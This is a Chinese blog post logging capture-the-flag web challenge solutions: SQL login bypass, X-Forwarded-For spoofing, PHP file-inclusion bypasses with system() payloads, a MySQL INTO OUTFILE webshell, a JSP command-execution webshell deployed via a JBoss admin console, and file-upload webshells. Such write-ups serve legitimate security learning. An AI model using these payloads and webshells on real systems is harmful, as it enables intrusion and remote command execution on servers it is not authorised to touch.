<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="一些些web的做题记录——持续更新, Lim_XuK">
    <meta name="description" content="晨光起于白塔尖顶，终将铺满阴霾之地。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>一些些web的做题记录——持续更新 | Lim_XuK</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Lim_XuK" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Lim_XuK</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Lim_XuK</div>
        <div class="logo-desc">
            
            晨光起于白塔尖顶，终将铺满阴霾之地。
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">一些些web的做题记录——持续更新</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/web/">
                                <span class="chip bg-color">web</span>
                            </a>
                        
                            <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                                <span class="chip bg-color">做题记录</span>
                            </a>
                        
                            <a href="/tags/misc/">
                                <span class="chip bg-color">misc</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category">
                                攻防
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-11-11
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="1-直接登陆"><a class="header-anchor" href="#1-直接登陆">¶</a>1.直接登陆</h2>
<blockquote>
<p>题目：<a target="_blank" rel="noopener" href="http://123.206.87.240:10004/">http://123.206.87.240:10004/</a></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916221840.png" alt=""></p>
<p>直接登陆的题目有两种解法：<strong>1.万能密码（ ’ or ‘1’='1 )</strong>,<strong>2.SQL注入</strong></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916222929.png" alt=""></p>
<p>获得flag：flag{7ae7de60f14eb3cbd9403a0c4328598d}</p>
<h2 id="2-我也不知道叫啥"><a class="header-anchor" href="#2-我也不知道叫啥">¶</a>2.我也不知道叫啥</h2>
<blockquote>
<p>题目：<a target="_blank" rel="noopener" href="http://123.206.87.240:10006/">http://123.206.87.240:10006/</a></p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916223121.png" alt=""></p>
<p>题目中提到<strong>请联系本地管理员登陆</strong>，意味着该网页会过滤除了本地管理员IP（127.0.0.1）以外，其他IP的访问。而IP数据包中<strong>X-forwarded-for</strong> 选项位可以说明该IP是来自于<strong>本地</strong></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916225342.png" alt=""></p>
<p>在这之间添加<strong>X-Forwarded-For:127.0.0.1</strong></p>
<p>发现</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916225622.png" alt=""></p>
<p>虽然绕过了IP过滤，但是密码错误了。所以我们返回原页面的原码中寻找</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916225935.png" alt=""></p>
<p>结尾两个==，判断其为base64</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916225915.png" alt=""></p>
<p>解码得：test123</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916230132.png" alt=""></p>
<p>注：</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210918101016.png" alt=""></p>
<h2 id="3-文件包含"><a class="header-anchor" href="#3-文件包含">¶</a>3.文件包含</h2>
<p>1.查看原码，进行分析</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>hello无过滤，page过滤php://</p>
<p>文件包含： php伪协议：php://input     post方法</p>
<p>​											php://filter/	写入写出</p>
<p>​											data://text/plain	传输各自内容</p>
<p>绕过：使用大写PHP，或第三个</p>
<h3 id="方法一："><a class="header-anchor" href="#方法一：">¶</a>方法一：</h3>
<p>PHP://input  之后输入ls，获得数据库中所有表单</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916231603.png" alt=""></p>
<p>得到</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916231655.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916233724.png" alt=""></p>
<p>Linux下<strong>cat</strong> 打开文件 ，输入后得到flag：</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916233758.png" alt=""></p>
<p>总结：<?php system('ls');?>获得当前目录下所有表单</p>
<p>​			<?php system('cat xxxx');?>打开目录下的某个文件</p>
<h3 id="方法二"><a class="header-anchor" href="#方法二">¶</a>方法二</h3>
<p>data://text/plain</p>
<?php system('ls');?>进行base64编码后
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916234125.png" alt=""></p>
<p>获得目录下表单</p>
<?php system('cat xxxx');?>进行编码
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916234305.png" alt=""></p>
<p>查看原码得：</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210916234338.png" alt=""></p>
<h3 id="方法三"><a class="header-anchor" href="#方法三">¶</a>方法三</h3>
<p>data://text/plain（一句话木马，cknife链接）</p>
<h3 id="方法四"><a class="header-anchor" href="#方法四">¶</a>方法四</h3>
<p>1.数据库里查看flag</p>
<p>2.数据库写马</p>
<pre><code>				select &quot;&lt;?php eval($_POST[v])?&gt;&quot; into outfile &quot;/tmp/shell.php&quot;;
</code></pre>
<p>前提：secure_file_priv 为空 ，允许写入写出文件</p>
<p>​										为null，不允许</p>
<p>​										为路径，只能在该路径下写入写出</p>
<p><strong>show variables like “secure_file_priv”</strong>  查看</p>
<p>Linux   – &gt; /tmp</p>
<h2 id="绿城杯——MISC"><a class="header-anchor" href="#绿城杯——MISC">¶</a>绿城杯——MISC</h2>
<blockquote>
<p>[warmup] 音频隐写</p>
</blockquote>
<p>将音频丢到Audacity 中</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215544.png" alt=""></p>
<p>拉到音频后面，听到一串杂音</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215910.png" alt=""></p>
<p>首先这之中的点不像摩斯电码，所以考虑看频谱图</p>
<p>点击左上面的倒三角，选择频谱图</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930215726.png" alt=""></p>
<p>flag就在这边</p>
<h2 id="长安杯——JBOSS漏洞"><a class="header-anchor" href="#长安杯——JBOSS漏洞">¶</a>长安杯——JBOSS漏洞</h2>
<blockquote>
<p>实际上没有做出来，只是后面复盘的时候发现其实还好，也就照葫芦画瓢</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/5a76f13809eb452aaa7583d2176ba9c3.jpg#pic_center" alt=""></p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221344.png" alt=""></p>
<p>进入Administration Console</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221447.png" alt=""></p>
<p>这边我第一次就admin admin进去了</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930221530.png" alt=""></p>
<p>第一次看到这个界面我以为没啥用，不过后面再看别人wp里面的时候就发现问题了</p>
<p>看到这个界面找到一个上传war压缩包的地方，Jboss漏洞考察的就是Jboss 5.x/6.x admin-Console后台部署war包相关的知识。</p>
<p>漏洞见下：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/103899123?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-4&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/qq_36119192/article/details/103899123?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-4&amp;spm=1001.2101.3001.4242</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token operator">&lt;</span><span class="token operator">%</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token operator">.</span><span class="token function">equals</span><span class="token punctuation">(</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pwd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        java<span class="token operator">.</span>io<span class="token operator">.</span>InputStream in <span class="token operator">=</span> Runtime<span class="token operator">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">exec</span><span class="token punctuation">(</span>request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword type-declaration">int</span> a <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>          
        byte<span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          
        out<span class="token operator">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token operator">=</span>in<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            out<span class="token operator">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword type-declaration">String</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          
        <span class="token punctuation">&#125;</span>
        out<span class="token operator">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>生成war包</p>
<p><img src="https://img-blog.csdnimg.cn/14576a4757b3466495cc993853e353de.png" alt=""></p>
<p>然后上传</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930222156.png" alt=""></p>
<p>之后传参，找出后台文件</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20210930222231.png" alt=""></p>
<p>之后cat</p>
<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/AppData/Roaming/Typora/typora-user-images/image-20210930222253970.png" alt=""></p>
<h2 id="攻防世界web——baby-web"><a class="header-anchor" href="#攻防世界web——baby-web">¶</a>攻防世界web——baby_web</h2>
<p>URL：<a target="_blank" rel="noopener" href="http://111.200.241.244:57092/1.php">http://111.200.241.244:57092/1.php</a></p>
<p>一进去就发现后缀是1.php，发生了重定向，因为一般进入一个网站后访问的都是index.php的PHP后缀。</p>
<p>我们把题目中的1.php，改成index.php，打开F12，打开index.php的文件</p>
<p>HTTP/1.1 302 Found<br>
date: Fri, 01 Oct 2021 12:28:37 GMT<br>
server: Apache/2.4.38 (Debian)<br>
x-powered-by: PHP/7.2.21<br>
flag: flag{very_baby_web}<br>
location: 1.php<br>
content-length: 17<br>
keep-alive: timeout=5, max=97<br>
connection: Keep-Alive<br>
content-type: text/html; charset=UTF-8</p>
<p>FLAG就在里面</p>
<h2 id="攻防世界web——Training-WWW-Robots"><a class="header-anchor" href="#攻防世界web——Training-WWW-Robots">¶</a>攻防世界web——Training-WWW-Robots</h2>
<p>网站信息为：</p>
<pre class="line-numbers language-none"><code class="language-none">In this little training challenge, you are going to learn about the [Robots_exclusion_standard](http:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Robots_exclusion_standard).
The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.
Sometimes these files reveal the directory structure instead protecting the content from being crawled.

Enjoy!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>URL后面加上/robots.txt</p>
<p>网站信息为：</p>
<pre class="line-numbers language-none"><code class="language-none">User-agent: *
Disallow: &#x2F;fl0g.php


User-agent: Yandex
Disallow: *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>URL后面改上/fl0g.php</p>
<p>cyberpeace{e85ff94f2cc376cf9ea6f64452797795}</p>
<h2 id="攻防世界web——Web-php-include"><a class="header-anchor" href="#攻防世界web——Web-php-include">¶</a>攻防世界web——Web_php_include</h2>
<h3 id="方法一"><a class="header-anchor" href="#方法一">¶</a>方法一</h3>
<p>网站内容包括</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>打开Burp Suite截取请求报文，进行修改。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/?page=Php://input&amp;</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header-name keyword">Host:</span> 111.200.241.244:55122
<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
<span class="token header-name keyword">Connection:</span> keep-alive
<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1
<span class="token header-name keyword">Cache-Control:</span> max-age=0
<span class="token header-name keyword">Content-Length:</span> 20

&lt;?php system('ls')?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注：网站存在对php的过滤，所以考虑将P大写绕过</p>
<p>发送报文，收到回复</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211001205112.png" alt=""></p>
<p>cat fl4gisisish3r3.php</p>
<p>$flag=“ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}”;</p>
<h3 id="方法二-v2"><a class="header-anchor" href="#方法二-v2">¶</a>方法二</h3>
<p><a target="_blank" rel="noopener" href="http://111.200.241.244:55122/?page=http://127.0.0.1/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E">http://111.200.241.244:55122/?page=http://127.0.0.1/?hello=&lt;?show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;</a></p>
<p>page要先过，才能执行hello，所以page的参数定义为本地地址即可</p>
<p>网页信息为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$page</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$page</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="upload系列"><a class="header-anchor" href="#upload系列">¶</a>upload系列</h2>
<h3 id="bugku——Flask-FileUpload"><a class="header-anchor" href="#bugku——Flask-FileUpload">¶</a>bugku——Flask_FileUpload</h3>
<p>上界面，发现一个传输的地方，点开，发现默认的登陆格式是jpg，png，所以我们尝试写一句话图片木马，进行传输，发现传输成功后F12提示有一个错误<code>SyntaxError: invalid syntax</code></p>
<p>百度后发现这是py的错误，所以我们考虑将这个图片木马改写成py脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>os.system指令，将括号内的函数在服务器上运行，因为不知道服务器的flag放在哪里，所以就直接尝试在当前目录下打开flag</p>
<p>，之后就能得到flag</p>
<h3 id="攻防世界web——upload1"><a class="header-anchor" href="#攻防世界web——upload1">¶</a>攻防世界web——upload1</h3>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211009205246.png" alt=""></p>
<p>上传的时候网页弹窗，再检查F12，发现原码中有check函数，调用JS代码</p>
<h4 id="法一：使用JSSW插件过滤脚本"><a class="header-anchor" href="#法一：使用JSSW插件过滤脚本">¶</a>法一：使用JSSW插件过滤脚本</h4>
<p>关掉网站的js之后，就可以进行.php后缀的上传</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211009205719.png" alt=""></p>
<p>上传成功后使用蚁剑链接</p>
<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211009210108.png" alt=""></p>
<p>链接成功后进入服务器端，在html文件夹下发现了flag.php，打开就是需要的</p>
<h4 id="法二：直接构造一句话图片木马"><a class="header-anchor" href="#法二：直接构造一句话图片木马">¶</a>法二：直接构造一句话图片木马</h4>
<p>将一句话木马的格式改为.jpg，打开BS上传，绕过前端JS过滤后，在BS将.jpg后缀改为.php后缀即可，之后再用蚁剑链接步骤同上即可找到flag.php</p>
<h3 id="bugku—文建上传"><a class="header-anchor" href="#bugku—文建上传">¶</a>bugku—文建上传</h3>
